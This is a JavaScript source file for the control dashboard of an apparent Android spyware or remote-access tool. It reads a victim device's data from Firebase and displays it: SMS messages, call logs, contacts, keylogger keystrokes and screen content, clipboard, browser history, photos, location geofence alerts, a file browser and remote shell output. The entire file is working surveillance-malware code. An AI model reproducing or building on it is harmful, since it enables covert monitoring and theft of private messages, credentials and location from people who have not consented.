// js/data-feeds.js
import { database, ref, onValue, deviceListeners, addListener, removeListener } from './firebase-config.js';
import { esc, fmtTime, getFriendlyApp } from './utils.js';

export function initializeDataFeedListeners(uid) {
    // 1. SMS
    listenToFeed(uid, 'sms', (d) => {
        const msgs = d.messages || []; 
        const c = document.getElementById('sms-count'); if(c) c.textContent = msgs.length;
        const f = document.getElementById('sms-feed'); if(!f) return;
        if(!msgs.length){f.innerHTML='No SMS data yet';return;}
        f.innerHTML = msgs.map(m=>`<div class="feed-item"><strong>${esc(m.sender||'Unknown')}</strong> <small>${fmtTime(m.timestamp)}</small><br>${esc(m.body||'')}</div>`).join('');
    });

    // 2. Call Log
    listenToFeed(uid, 'call_log', (d) => {
        const calls = d.calls||[]; 
        const c = document.getElementById('calls-count'); if(c) c.textContent = calls.length;
        const f = document.getElementById('calls-feed'); if(!f) return;
        if(!calls.length){f.innerHTML='No call data yet';return;}
        f.innerHTML = calls.map(c=>{
            const i=c.type==='incoming'?'':c.type==='outgoing'?'📤':'';
            const dur=c.duration_seconds?`${Math.floor(c.duration_seconds/60)}m ${c.duration_seconds%60}s`:'--';
            return `<div class="feed-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${fmtTime(c.timestamp)} • ${dur} • ${c.type}</small></div>`;
        }).join('');
    });

    // 3. Contacts
    listenToFeed(uid, 'contacts', (d) => {
        const ct = d.contacts||[]; 
        const c = document.getElementById('contacts-count'); if(c) c.textContent = ct.length;
        const f = document.getElementById('contacts-feed'); if(!f) return;
        if(!ct.length){f.innerHTML='No contact data yet';return;}
        var grouped = {};
        ct.forEach(function(c) {
            var name = c.name || 'Unknown';
            if(!grouped[name]) grouped[name] = [];
            var num = c.number || '';
            var typ = c.type || '';
            var exists = grouped[name].some(function(n){return n.number===num && n.type===typ;});
            if(!exists) grouped[name].push({number:num, type:typ});
        });
        var names = Object.keys(grouped).sort(function(a,b){return a.localeCompare(b);});
        var html = '<div class="feed-item" style="color:#00ff88;">👥 ' + names.length + ' unique contacts (' + ct.length + ' total entries)</div>';
        names.forEach(function(name) {
            var nums = grouped[name];
            var numHtml = nums.map(function(n){return esc(n.number) + ' <span style="color:#555;">• ' + esc(n.type) + '</span>';}).join('<br>');
            html += '<div class="feed-item"><strong>' + esc(name) + '</strong><br><small>' + numHtml + '</small></div>';
        });
        f.innerHTML = html;
    });

    // 4. WiFi
    listenToFeed(uid, 'wifi', (d) => {
        const nets = d.nearby_networks||[]; 
        const c = document.getElementById('wifi-count'); if(c) c.textContent = nets.length;
        const f = document.getElementById('wifi-feed'); if(!f) return;
        let h = `<div class="feed-item" style="color:#00ff88;">Connected: <strong>${esc(d.current_ssid||'Not connected')}</strong> (RSSI: ${d.current_rssi||'--'})</div>`;
        h += nets.slice(0,30).map(n=>{const b=n.signal_strength>-50?'':n.signal_strength>-70?'':'🔴';const l=n.is_secured?'🔒':'';return `<div class="feed-item">${b} ${l} <strong>${esc(n.ssid||'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small></div>`;}).join('');
        f.innerHTML = h;
    });

    // 5. Apps
    listenToFeed(uid, 'installed_apps', (d) => {
        const apps = d.apps||[]; 
        const c = document.getElementById('apps-count'); if(c) c.textContent = apps.length;
        const f = document.getElementById('apps-feed'); if(!f) return;
        if(!apps.length){f.innerHTML='No app data yet';return;}
        const ua = apps.filter(a=>!a.is_system); const sa = apps.filter(a=>a.is_system);
        let h = `<div class="feed-item" style="color:#00ff88;">📦 ${ua.length} user apps • ${sa.length} system apps</div>`;
        h += ua.slice(0,50).map(a=>`<div class="feed-item"><strong>${esc(a.name||a.package_name)}</strong> <small>v${a.version_name||'?'} • ${a.package_name}</small></div>`).join('');
        f.innerHTML = h;
    });

    // 6. Device Info
    listenToFeed(uid, 'device_info', (d) => {
        const f = document.getElementById('deviceinfo-feed'); if(!f) return;
        const rows = [['Model',d.model],['Brand',d.brand],['Android',d.android_version],['SDK',d.sdk_version],['Storage',`${d.storage_used_percent||'?'}% used (${d.storage_free_gb||'?'}GB free)`],['RAM',`${d.ram_available_mb||'?'}MB / ${d.ram_total_mb||'?'}MB`],['Carrier',d.carrier],['Network',d.network_type],['Wi-Fi',d.wifi_ssid],['IP',d.wifi_ip],['Screen',`${d.screen_width}x${d.screen_height}`],['Uptime',`${Math.floor((d.uptime_seconds||0)/3600)}h ${Math.floor(((d.uptime_seconds||0)%3600)/60)}m`]];
        f.innerHTML = rows.map(([k,v])=>`<div class="feed-item"><strong>${k}:</strong> ${v||'--'}</div>`).join('');
    });

    // 7. Battery Details
    listenToFeed(uid, 'battery_current', (d) => {
        const f = document.getElementById('battery-feed'); if(!f) return;
        const rows = [['Level',`${d.level_percent||'?'}%`],['Status',d.status],['Health',d.health],['Temp',`${d.temperature_c||'?'}°C`],['Voltage',`${d.voltage_mv||'?'}mV`],['Source',d.charge_source],['Tech',d.technology]];
        f.innerHTML = rows.map(([k,v])=>`<div class="feed-item"><strong>${k}:</strong> ${v||'--'}</div>`).join('');
    });

    // 8. KEYLOGGER
    listenToFeed(uid, 'keylog', (d) => {
        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
        const c = document.getElementById('keylog-count'); if(c) c.textContent = items.length;
        const f = document.getElementById('keylog-feed'); if(!f) return;
        if(!items.length){f.innerHTML='No keystrokes yet (enable Accessibility Service)';return;}

        var systemApps = ['com.samsung.android.biometrics', 'com.android.systemui', 'com.samsung.android.app', 'com.google.android'];
        var grouped = [];
        var prev = null;
        items.forEach(function(k) {
            var app = k.app || 'unknown';
            var text = (k.text || '').trim();
            if(!text) return;
            var clean = text.replace(/[\u200B-\u200D\uFEFF]/g, '');
            if(clean.length === 0) return;

            var isAppSwitch = (k.event === 'app_switch');
            var isScreenContent = (k.event === 'screen_content');
            var isSystem = systemApps.some(function(s){ return app.indexOf(s) === 0; });

            if(isAppSwitch) {
                grouped.push({app: app, text: text, timestamp: k.timestamp, isSystem: false, event: 'app_switch', previous_app: k.previous_app});
                prev = null;
                return;
            }

            var isDuplicate = prev && !prev.isAppSwitch && !prev.isScreenContent && prev.app === app && prev.text === text && (k.timestamp - prev.timestamp) < 2000;
            if(isDuplicate) return;

            grouped.push({app: app, text: text, timestamp: k.timestamp, isSystem: isSystem, event: k.event || 'text_changed'});
            prev = {app: app, text: text, timestamp: k.timestamp, isAppSwitch: false, isScreenContent: isScreenContent};
        });

        var merged = [];
        for(var i = 0; i < grouped.length; i++) {
            var cur = grouped[i];
            if(cur.event === 'app_switch' || cur.event === 'screen_content') { merged.push(cur); continue; }
            var skip = false;
            if(i + 1 < grouped.length) {
                var next = grouped[i + 1];
                if(next.event !== 'app_switch' && next.event !== 'screen_content' && next.app === cur.app && next.text.indexOf(cur.text) === 0 && next.text.length > cur.text.length && (next.timestamp - cur.timestamp) < 1500) {
                    skip = true;
                }
            }
            if(!skip) merged.push(cur);
        }

        var display = merged.slice(0, 80);
        var html = '<div class="feed-item" style="color:#00ff88;font-size:10px;">⌨️ ' + display.length + ' events — <span style="color:#4ecdc4;">⌨️ USER</span> typed · <span style="color:#ffd93d;">🖥️ DEVICE</span> screen · <span style="color:#ff6b6b;">📱 APP</span> switch · <span style="color:#a78bfa;">📝 CONTENT</span> full screen</div>';

        display.forEach(function(k) {
            var icon, label, color, bgColor, borderColor;
            if(k.event === 'app_switch') {
                icon = '📱'; label = 'APP SWITCH'; color = '#ff6b6b'; bgColor = 'rgba(255,107,107,0.08)'; borderColor = '#ff6b6b';
            } else if(k.event === 'screen_content') {
                icon = ''; label = 'SCREEN'; color = '#a78bfa'; bgColor = 'rgba(167,139,250,0.08)'; borderColor = '#a78bfa';
            } else if(k.isSystem) {
                icon = '🖥️'; label = 'DEVICE'; color = '#ffd93d'; bgColor = 'rgba(255,217,61,0.05)'; borderColor = '#ffd93d';
            } else {
                icon = '⌨️'; label = 'USER'; color = '#4ecdc4'; bgColor = 'rgba(78,205,196,0.05)'; borderColor = '#4ecdc4';
            }

            var appName = getFriendlyApp(k.app);
            html += '<div class="feed-item" style="border-left:3px solid ' + borderColor + ';padding-left:8px;background:' + bgColor + ';">';
            html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2px;">';
            html += '<span style="color:' + color + ';font-size:10px;font-weight:bold;">' + icon + ' ' + label + '</span>';
            html += '<span style="color:#555;font-size:9px;">' + esc(appName) + ' • ' + fmtTime(k.timestamp) + '</span>';
            html += '</div>';

            if(k.event === 'app_switch') {
                var prevName = k.previous_app ? getFriendlyApp(k.previous_app) : 'Home';
                html += '<div style="color:#ff6b6b;font-size:11px;">' + esc(prevName) + ' → <strong>' + esc(appName) + '</strong></div>';
            } else if(k.event === 'screen_content') {
                html += '<div style="color:#a78bfa;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow-y:auto;line-height:1.6;padding:6px;background:rgba(0,0,0,0.2);border-radius:4px;margin-top:4px;">' + esc(k.text) + '</div>';
            } else {
                html += '<code style="color:#fff;font-size:11px;word-break:break-all;">' + esc(k.text) + '</code>';
            }
            html += '</div>';
        });
        f.innerHTML = html;
    });

    // 9. Geofence Alerts
    listenToFeed(uid, 'geofence_alerts', (d) => {
        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,20);
        const f = document.getElementById('geofence-feed'); if(!f) return;
        if(!items.length){f.innerHTML='No geofence alerts';return;}
        f.innerHTML = items.map(g=>{const i=g.event==='LEFT'?'':'✅';return `<div class="feed-item ${g.event==='LEFT'?'alert-item':''}">${i} <strong>${g.event}</strong> <small>${fmtTime(g.timestamp)} • ${Math.round(g.distance_meters||0)}m</small><br>📍 ${parseFloat(g.current_lat||0).toFixed(6)}, ${parseFloat(g.current_lng||0).toFixed(6)}</div>`;}).join('');
    });

    // 10. Clipboard
    listenToFeed(uid, 'clipboard', (d) => {
        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,20);
        const f = document.getElementById('clipboard-feed'); if(!f) return;
        if(!items.length){f.innerHTML='No clipboard data yet';return;}
        f.innerHTML = items.map(c=>`<div class="feed-item"><small>${fmtTime(c.timestamp)} • ${c.length||0} chars</small><br><code>${esc((c.text||'').substring(0,200))}</code></div>`).join('');
    });

    // 11. Browser History
    listenToFeed(uid, 'browser_history', (d) => {
        const h = d.history||[]; 
        const f = document.getElementById('browser-feed'); if(!f) return;
        if(!h.length){f.innerHTML='No browser history yet';return;}
        f.innerHTML = h.slice(0,50).map(h=>`<div class="feed-item"><strong>${esc(h.title||'Untitled')}</strong><br><a href="${h.url}" target="_blank" style="color:#4ecdc4;font-size:11px;">${esc((h.url||'').substring(0,80))}</a> <small>${fmtTime(h.date)}</small></div>`).join('');
    });

    // 12. Gallery
    listenToFeed(uid, 'gallery_list', (d) => {
        const p = d.photos||[]; 
        const f = document.getElementById('gallery-feed'); if(!f) return;
        if(d.status==='loading') {
            let html = `<div class="feed-item" style="color:#ffaa00;">⏳ Loading thumbnails... ${d.total_read||0} photos processed</div>`;
            html += p.slice(0,10).map(p => {
                const thumb = p.thumbnail_url || '';
                const imgHtml = thumb ? `<img src="${thumb}" style="width:100%;max-width:320px;border-radius:6px;margin-bottom:4px;" loading="lazy">` : `<div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:flex;align-items:center;justify-content:center;color:#555;font-size:10px;">Generating...</div>`;
                return `<div class="feed-item">${imgHtml}<small>${esc(p.name||'')} • ${(p.size_kb||0)}KB</small></div>`;
            }).join('');
            f.innerHTML = html;
            return;
        }
        if(!p.length){f.innerHTML='No gallery data yet';return;}
        f.innerHTML = p.slice(0,30).map(p => {
            const thumb = p.thumbnail_url || '';
            const imgHtml = thumb ? `<img src="${thumb}" style="width:100%;max-width:320px;border-radius:6px;margin-bottom:4px;cursor:pointer;display:block;" onclick="openPreview(this.src)" loading="lazy">` : `<div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:flex;align-items:center;justify-content:center;color:#555;font-size:10px;">No thumbnail</div>`;
            return `<div class="feed-item">${imgHtml}<strong>${esc(p.name||'Unknown')}</strong> <small>${fmtTime(p.date_taken)} • ${(p.size_kb||0)}KB</small></div>`;
        }).join('');
    });

    // 13. Shell Output
    listenToFeed(uid, 'shell_output', (d) => {
        const o = document.getElementById('shell-output'); if(!o||!d) return;
        o.style.display = 'block';
        let text = '$ ' + (d.command||'') + '\n\n';
        if(d.exit_code === -999) {
            text += ' Executing...\n';
        } else {
            text += (d.stdout || '(no output)');
            if(d.stderr) text += '\n\nSTDERR:\n' + d.stderr;
            text += '\n\nExit code: ' + (d.exit_code ?? '?');
            if(d.timed_out) text += ' ⚠️ TIMED OUT';
        }
        o.textContent = text;
        o.scrollTop = o.scrollHeight;
    });

    // 14. File Browser
    listenToFeed(uid, 'file_browser', (d) => {
        const o = document.getElementById('file-output'); if(!o||!d) return;
        o.style.display = 'block';
        if(d.error) {
            o.innerHTML = '<span style="color:#ff6b6b;">❌ ' + esc(d.error) + '</span>';
            return;
        }
        if(d.is_file) {
            let html = '<div style="margin-bottom:10px;">';
            if(d.preview_url) {
                var isVid = (d.file_type === 'video');
                html += '<div style="position:relative;display:inline-block;cursor:pointer;" onclick="openPreview(this.querySelector(\'img\').src)">';
                html += '<img src="' + d.preview_url + '" style="width:100%;max-width:300px;border-radius:6px;display:block;" loading="lazy">';
                if(isVid) {
                    html += '<div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:40px;height:40px;background:rgba(0,0,0,0.6);border-radius:50%;display:flex;align-items:center;justify-content:center;"><div style="width:0;height:0;border-left:14px solid #fff;border-top:9px solid transparent;border-bottom:9px solid transparent;margin-left:3px;"></div></div>';
                }
                html += '</div>';
            }
            html += '<div style="font-size:14px;color:#fff;margin-bottom:6px;margin-top:8px;">' + esc(d.name||'File') + '</div>';
            html += '<div style="color:#888;font-size:11px;">Size: ' + (d.size_formatted||'?') + '</div>';
            html += '<div style="color:#888;font-size:11px;">Type: ' + (d.file_type||'unknown') + '</div>';
            html += '<div style="color:#888;font-size:11px;">Path: ' + esc(d.absolute_path||d.current_path||'') + '</div>';
            html += '</div>';
            o.innerHTML = html;
            return;
        }
        let html = '<div style="color:#00ff88;font-size:13px;margin-bottom:4px;">📂 ' + esc(d.current_path||'/') + '</div>';
        html += '<div style="color:#666;font-size:10px;margin-bottom:10px;">' + (d.total_dirs||0) + ' folders • ' + (d.total_files||0) + ' files</div>';
        var entries = d.entries || [];
        entries.forEach(function(e) {
            var pathEsc = e.path.replace(/'/g, "\\'").replace(/"/g, '&quot;');
            if(e.is_directory) {
                html += '<div style="padding:6px 0;border-bottom:1px solid #111;cursor:pointer;" onclick="navigateToFile(\'' + pathEsc + '\')">';
                html += '<div style="display:flex;align-items:center;gap:8px;"><span style="font-size:18px;">📁</span><div style="flex:1;min-width:0;"><div style="color:#ffd93d;font-size:12px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">' + esc(e.name) + '</div></div></div></div>';
            } else {
                html += '<div style="padding:6px 0;border-bottom:1px solid #111;display:flex;gap:10px;align-items:center;">';
                html += '<div style="width:50px;height:50px;background:#1a1a2e;border-radius:4px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:22px;">' + (e.icon||'') + '</div>';
                html += '<div style="flex:1;min-width:0;"><div style="font-size:12px;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">' + esc(e.name) + '</div><div style="color:#555;font-size:10px;">' + (e.size_formatted||'') + '</div></div></div>';
            }
        });
        o.innerHTML = html;
    });

    // 15. Network Traffic
    listenToFeed(uid, 'traffic_current', (d) => {
        const f = document.getElementById('traffic-feed'); if(!f||!d) return;
        let html = `<div class="feed-item"><strong>📊 Total</strong></div>`;
        html += `<div class="feed-item">RX: ${d.total_rx_mb||'?'} MB | TX: ${d.total_tx_mb||'?'} MB</div>`;
        html += `<div class="feed-item"><strong>📱 Mobile</strong></div>`;
        html += `<div class="feed-item">RX: ${d.mobile_rx_mb||'?'} MB | TX: ${d.mobile_tx_mb||'?'} MB</div>`;
        if(d.wifi_rx_mb !== undefined) {
            html += `<div class="feed-item"><strong> Wi-Fi</strong></div>`;
            html += `<div class="feed-item">RX: ${d.wifi_rx_mb||'?'} MB | TX: ${d.wifi_tx_mb||'?'} MB</div>`;
        }
        html += `<div class="feed-item"><small>${fmtTime(d.timestamp)}</small></div>`;
        f.innerHTML = html;
    });

    // 16. Device Control Status
    listenToFeed(uid, 'device_control_status', (d) => {
        const f = document.getElementById('devicecontrol-feed'); if(!f||!d) return;
        var icon = d.status === 'success' ? '✅' : d.status === 'ui_opened' ? '' : '❌';
        var color = d.status === 'success' ? '#00ff88' : d.status === 'ui_opened' ? '#ffd93d' : '#ff6b6b';
        var actionName = (d.action || 'unknown').replace(/_/g, ' ').toUpperCase();
        var html = '<div class="feed-item" style="border-left:3px solid ' + color + ';padding-left:10px;">';
        html += '<div style="color:' + color + ';font-weight:bold;font-size:12px;">' + icon + ' ' + actionName + ' — ' + (d.status || '').toUpperCase() + '</div>';
        html += '<div style="color:#888;font-size:11px;margin-top:4px;">' + esc(d.message || '') + '</div>';
        html += '<div style="color:#555;font-size:10px;margin-top:2px;">' + fmtTime(d.timestamp) + '</div>';
        html += '</div>';
        f.innerHTML = html;
    });
}

function listenToFeed(uid, path, cb) {
    const r = ref(database, `devices/${uid}/${path}`); 
    const k = `feed-${path}-${uid}`;
    removeListener(k);
    const listener = onValue(r, (s) => { 
        if(s.exists()) try{cb(s.val());}catch(e){console.error(`Feed [${path}]:`,e);} 
    });
    addListener(k, listener);
}

// Global helpers for dynamically injected HTML
window.navigateToFile = function(path) {
    import('./command-handler.js').then(m => {
        // We need to get currentUid somehow - let's use a global for now or pass it
        // For simplicity in this refactor, we'll use window.currentDeviceUid
        if(window.currentDeviceUid) m.sendCmd(window.currentDeviceUid, 'list_files', path.trim());
    });
    var o = document.getElementById('file-output');
    if(o) { o.style.display='block'; o.innerHTML='<span style="color:#ffaa00;">⏳ Loading ' + esc(path) + '...</span>'; }
    var inp = document.getElementById('file-path');
    if(inp) inp.value = path.trim();
};

window.openPreview = function(src) {
    if(!src) return;
    window.open(src, '_blank');
};
